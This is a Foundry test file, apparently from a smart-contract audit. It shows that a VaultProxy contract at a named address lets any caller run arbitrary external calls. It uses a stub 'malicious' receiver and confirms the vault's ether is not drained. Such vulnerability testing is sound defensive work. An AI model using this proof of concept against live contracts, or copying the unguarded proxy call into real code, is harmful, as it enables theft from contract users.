// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xbaa3de6504690efb064420d89e871c27065cdd52.sol";

contract MaliciousReceiver {
    address public attacker;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    function arbitraryAction() external pure returns (bool) {
        return true;
    }

    function dangerousCall() external pure returns (bool) {
        // Potential malicious logic
        return true;
    }
}

contract VaultProxyTest is Test {
    VaultProxy vault;
    address owner = address(this);
    address attacker = address(0xBAD);
    MaliciousReceiver maliciousContract;

    function setUp() public {
        vm.deal(attacker, 1 ether);
        vault = new VaultProxy{value: 10 ether}();
        maliciousContract = new MaliciousReceiver(attacker);
    }

    function test_ArbitraryCallVulnerability() public {
        // 1. Demonstrate arbitrary external call execution
        bytes memory data = abi.encodeWithSignature("arbitraryAction()");
        vm.prank(attacker);
        vault.proxy{value: 0}(address(maliciousContract), data);
        assertTrue(maliciousContract.arbitraryAction(), "Arbitrary call failed");
        
        // 2. Show a potentially dangerous call is possible
        bytes memory dangerData = abi.encodeWithSignature("dangerousCall()");
        vm.prank(attacker);
        vault.proxy{value: 0}(address(maliciousContract), dangerData);
        assertTrue(maliciousContract.dangerousCall(), "Dangerous call failed");

        // The vault's ETH balance remains unchanged because:
        // - The proxy function only forwards msg.value sent with the call
        // - To actually drain vault funds, another vulnerability would be needed
        //   (like an unprotected self-destruct or owner change function)
        assertEq(address(vault).balance, 10 ether, "Vault balance changed unexpectedly");
        
        // Final vulnerability verdict
        console.log("Vulnerability Exists: Unauthorized arbitrary external call execution");
    }

    // Helper function to receive ether
    receive() external payable {}
}